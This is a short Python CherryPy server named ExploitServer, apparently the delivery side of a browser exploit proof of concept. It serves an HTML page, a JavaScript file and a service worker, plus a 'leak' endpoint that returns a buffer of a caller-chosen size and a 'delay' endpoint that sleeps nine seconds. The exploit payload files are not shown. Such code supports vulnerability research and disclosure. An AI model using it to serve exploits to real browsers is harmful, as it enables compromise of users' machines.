#! /usr/bin/python

# Copyright 2018 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import cherrypy
import re
import socket
import sys
import time

class ExploitServer(object):
  @cherrypy.expose
  def index(self):
    cherrypy.response.headers['Cache-Control'] = 'no-store'
    cherrypy.response.headers['Content-Type'] = 'text/html'
    with open('index.html', 'rb') as tmp:
      return tmp.read()

  @cherrypy.expose
  def main(self):
    cherrypy.response.headers['Cache-Control'] = 'no-store'
    cherrypy.response.headers['Content-Type'] = 'application/javascript'
    with open('main.js', 'rb') as tmp:
      return tmp.read()

  @cherrypy.expose
  def service_worker(self):
    cherrypy.response.headers['Cache-Control'] = 'no-store'
    cherrypy.response.headers['Content-Type'] = 'application/javascript'
    with open('service_worker.js', 'rb') as tmp:
      return tmp.read()

  @cherrypy.expose
  def leak(self, size):
    cherrypy.response.headers['Cache-Control'] = 'no-store'
    cherrypy.response.headers['Content-Type'] = 'text/html'
    return b'A' * int(size, 16)

  @cherrypy.expose
  def delay(self):
    cherrypy.response.headers['Cache-Control'] = 'no-store'
    cherrypy.response.headers['Content-Type'] = 'text/html'
    time.sleep(9)
    return b''

def main():
  cherrypy.config.update({
    'log.screen': False,
    'server.ssl_module': 'builtin',
    'server.ssl_certificate': 'fullchain.pem',
    'server.ssl_private_key': 'privkey.pem',
    'server.socket_port':int(sys.argv[1]),
    'server.socket_host':'0.0.0.0'
    })

  cherrypy.quickstart(ExploitServer())

if __name__ == '__main__':
  main()
